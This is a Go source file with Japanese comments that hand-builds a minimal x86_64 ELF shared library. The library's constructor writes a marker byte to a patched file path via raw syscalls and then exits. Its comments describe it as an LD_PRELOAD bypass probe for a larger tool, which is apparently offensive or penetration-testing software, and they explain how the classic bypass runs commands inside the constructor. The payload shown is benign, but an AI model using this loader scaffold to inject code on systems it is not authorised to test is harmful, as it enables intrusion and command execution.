// ldpreloadgen は session/ldpreload_x86_64.so をオフラインで生成する: freestanding x86_64 ELF
// 共有ライブラリで、コンストラクタ(DT_INIT_ARRAY)は純粋な syscall で「パススロット」が指すファイルに 1 バイトの
// 疎通確認マーカーを書いてから _exit(0)——「ロード即証明」の最小限の LD_PRELOAD バイパスプローブ(振り返り R1、
// 使い方は session/bypass.go 参照)。libc 依存も外部ツールチェーン依存もない(ビルドホストに
// as/ld/gcc は不要): ELF ヘッダ/プログラムヘッダ/動的セクション/機械語はすべて本生成器がレイアウト定数から直接出力する。
//
// 使い方(ビルド期の外で手動実行し、成果物をリポジトリにコミットする):
//
//	go run ./session/ldpreloadgen
//
// レイアウト(vaddr == ファイルオフセット、2 つの PT_LOAD はページ境界に整列):
//
//	RX セグメント(off 0): ELF header(64B) + 3×Phdr(56B) + コンストラクタの機械語(off 0x100)
//	RW セグメント(off 0x1000): init_array → dynamic[8] → sysv hash → strtab →
//	  symtab(空) → パススロット magic(16B) → パススロット(128B、投与前に書き換え) → マーカーバイト
//
// コンストラクタの機械語(生の syscall。目標側の glibc/musl いずれの動的リンカでもロードされれば実行される):
//
//	open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644)   ; rax=2
//	write(fd, marker, 1)                          ; rax=1
//	_exit(0)                                      ; rax=60
//
// _exit(0) は同時に preload された sendmail/sh 本体を止める——これがまさに LD_PRELOAD バイパスの
// 古典的な意味論: 子プロセスはロード即終了し、コマンド実行はすべてコンストラクタ内で完結する(本プローブはマーカーを書くだけ)。
package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
)

const (
	pageSize   = 0x1000
	codeOff    = 0x100  // コンストラクタの RX セグメント内オフセット(= vaddr)
	rwOff      = 0x1000 // RW セグメントのオフセット(= vaddr)
	rxFileSz   = 0x200  // RX セグメントの filesz(整列の余裕)
	magicOff   = 0x10C0 // パススロット magic の RW セグメント内 vaddr
	pathOff    = 0x10D0 // パススロットの vaddr(magic の直後)
	pathLen    = 128
	markerOff  = 0x1150 // マーカーバイトの vaddr
	rwFileSz   = 0x1151
	dynOff     = 0x1010 // dynamic セクションの vaddr
	dynCount   = 8
	hashOff    = 0x1090
	strtabOff  = 0x10A4
	symtabOff  = 0x10A8
	initArrOff = 0x1000
)

var magic = []byte("ARTEXLDPATHv1\x00\x00\x00") // 16B、session/bypass.go と一致

// constructor はコンストラクタの機械語を生成する。rip 相対アドレッシングの disp はレイアウト定数から計算し、決め打ちしない。
func constructor() []byte {
	var c []byte
	emit := func(b ...byte) { c = append(c, b...) }
	rip := func() int { return codeOff + len(c) } // 現在の書き込み位置の vaddr

	emit(0xB8, 0x02, 0x00, 0x00, 0x00) // mov eax, 2 (sys_open)
	// lea rdi, [rip+disp]: disp = pathOff - この命令の終了アドレス
	emit(0x48, 0x8D, 0x3D)
	disp1 := int32(pathOff - (rip() + 4))
	var tmp [4]byte
	binary.LittleEndian.PutUint32(tmp[:], uint32(disp1))
	emit(tmp[:]...)
	emit(0xBE, 0x41, 0x02, 0x00, 0x00) // mov esi, 0x241 (O_WRONLY|O_CREAT|O_TRUNC)
	emit(0xBA, 0xA4, 0x01, 0x00, 0x00) // mov edx, 0x1A4 (0644)
	emit(0x0F, 0x05)                   // syscall → fd in rax
	emit(0x48, 0x89, 0xC7)             // mov rdi, rax (fd)
	emit(0xB8, 0x01, 0x00, 0x00, 0x00) // mov eax, 1 (sys_write)
	emit(0x48, 0x8D, 0x35)             // lea rsi, [rip+disp]
	disp2 := int32(markerOff - (rip() + 4))
	binary.LittleEndian.PutUint32(tmp[:], uint32(disp2))
	emit(tmp[:]...)
	emit(0xBA, 0x01, 0x00, 0x00, 0x00) // mov edx, 1
	emit(0x0F, 0x05)                   // syscall
	emit(0xB8, 0x3C, 0x00, 0x00, 0x00) // mov eax, 60 (sys_exit)
	emit(0x31, 0xFF)                   // xor edi, edi
	emit(0x0F, 0x05)                   // syscall
	emit(0xC3)                         // ret(到達しないが保険)
	return c
}

func main() {
	code := constructor()
	if codeOff+len(code) > rxFileSz {
		fatalf("コンストラクタの機械語 %d バイトが RX セグメントの予約 %d を超えています", len(code), rxFileSz-codeOff)
	}

	out := make([]byte, rwOff+rwFileSz)

	// ---- ELF header ----
	copy(out[0:], []byte{0x7F, 'E', 'L', 'F', 2, 1, 1, 0}) // 64-bit LE
	binary.LittleEndian.PutUint16(out[16:], 3)             // e_type = ET_DYN
	binary.LittleEndian.PutUint16(out[18:], 62)            // e_machine = EM_X86_64
	binary.LittleEndian.PutUint32(out[20:], 1)             // e_version
	binary.LittleEndian.PutUint64(out[32:], 64)            // e_phoff
	binary.LittleEndian.PutUint16(out[52:], 64)            // e_ehsize
	binary.LittleEndian.PutUint16(out[54:], 56)            // e_phentsize
	binary.LittleEndian.PutUint16(out[56:], 3)             // e_phnum

	// ---- program headers ----
	ph := func(i int, ptype, flags uint32, off, vaddr, filesz, memsz, align uint64) {
		b := out[64+i*56:]
		binary.LittleEndian.PutUint32(b[0:], ptype)
		binary.LittleEndian.PutUint32(b[4:], flags)
		binary.LittleEndian.PutUint64(b[8:], off)
		binary.LittleEndian.PutUint64(b[16:], vaddr)
		binary.LittleEndian.PutUint64(b[24:], vaddr) // p_paddr は vaddr と同じ
		binary.LittleEndian.PutUint64(b[32:], filesz)
		binary.LittleEndian.PutUint64(b[40:], memsz)
		binary.LittleEndian.PutUint64(b[48:], align)
	}
	ph(0, 1, 5, 0, 0, rxFileSz, rxFileSz, pageSize)          // PT_LOAD R+X
	ph(1, 1, 6, rwOff, rwOff, rwFileSz, rwFileSz, pageSize)  // PT_LOAD R+W
	ph(2, 2, 6, dynOff, dynOff, dynCount*16, dynCount*16, 8) // PT_DYNAMIC

	// ---- コンストラクタの機械語 ----
	copy(out[codeOff:], code)

	// ---- RW セグメント ----
	binary.LittleEndian.PutUint64(out[initArrOff:], codeOff) // DT_INIT_ARRAY → コンストラクタ

	dyn := func(i int, tag, val uint64) {
		b := out[dynOff+i*16:]
		binary.LittleEndian.PutUint64(b[0:], tag)
		binary.LittleEndian.PutUint64(b[8:], val)
	}
	dyn(0, 4, hashOff)     // DT_HASH
	dyn(1, 5, strtabOff)   // DT_STRTAB
	dyn(2, 6, symtabOff)   // DT_SYMTAB
	dyn(3, 10, 1)          // DT_STRSZ
	dyn(4, 11, 24)         // DT_SYMENT
	dyn(5, 25, initArrOff) // DT_INIT_ARRAY
	dyn(6, 27, 8)          // DT_INIT_ARRAYSZ
	dyn(7, 0, 0)           // DT_NULL

	// sysv hash: nbucket=1, nchain=1、すべて空(本ライブラリはシンボルを公開しない)。
	binary.LittleEndian.PutUint32(out[hashOff:], 1)
	binary.LittleEndian.PutUint32(out[hashOff+4:], 1)
	// strtab は "\0" のみ、symtab は全ゼロの空シンボル 1 個(24B)——make で既にゼロ。

	copy(out[magicOff:], magic)
	// パススロット(128B)は既定で全ゼロ: 投与前に session/bypass.go が疎通確認マーカーパスへ書き換える。
	out[markerOff] = 'K'

	dst := filepath.Join("session", "ldpreload_x86_64.so")
	if len(os.Args) > 1 {
		dst = os.Args[1] // 明示的な出力パスを許可(テスト/再生成)
	}
	if err := os.WriteFile(dst, out, 0o644); err != nil {
		fatalf("%s への書き込み: %v", dst, err)
	}
	fmt.Printf("%s を生成しました(%d バイト、コンストラクタ %d バイト @ vaddr 0x%x)\n", dst, len(out), len(code), codeOff)
}

func fatalf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "ldpreloadgen: "+format+"\n", args...)
	os.Exit(1)
}
